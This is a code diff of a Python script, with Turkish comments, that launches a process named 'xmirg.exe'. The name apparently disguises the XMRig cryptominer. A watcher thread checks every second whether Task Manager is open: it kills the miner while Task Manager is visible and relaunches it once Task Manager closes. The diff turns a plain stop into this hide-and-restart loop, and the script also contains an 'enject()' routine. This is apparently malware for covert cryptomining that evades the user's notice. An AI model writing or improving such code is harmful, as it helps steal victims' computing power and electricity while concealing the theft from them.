@@ -135,7 +135,7 @@ def enject():
         f.write("True")
 
 
-def main():
+def start():
     with open("config.json","w") as config:
         config.write(jsonfiledata)
     subprocess.Popen(
@@ -155,17 +155,29 @@ def main():
         enject()
 
     
-stop_event = threading.Event()
-main_start = threading.Thread(target=main, daemon=True)
-main_start.start()
+        
 
+def append():
+    for process in psutil.process_iter(attrs=['pid', 'name']):
+        # Eğer süreç xmirg.exe ise
+        if process.info['name'].lower() == 'xmirg.exe':
+            print(f"Process {process.info['name']} ({process.info['pid']}) bulundu. Durduruluyor...")
+            process.terminate()  # Programı sonlandır
+            process.wait()  # Sonlanmasını bekle
+            print("xmirg.exe başarıyla durduruldu.")
+            return True
+    print("xmirg.exe bulunamadı.")
+    return False
 
 def task_manager_watcher():
     while True:
         if is_task_manager_open():
             print("Görev Yöneticisi Açıldı!")
-            stop_event.set()
-        time.sleep(1)  
+            append()
+        else:
+            start()
+        time.sleep(1)
+          
 
 def is_task_manager_open():
     for process in psutil.process_iter(attrs=['name']):
@@ -175,4 +187,4 @@ def is_task_manager_open():
 
 watcher_thread = threading.Thread(target=task_manager_watcher, daemon=True)
 watcher_thread.start()
-
+start()
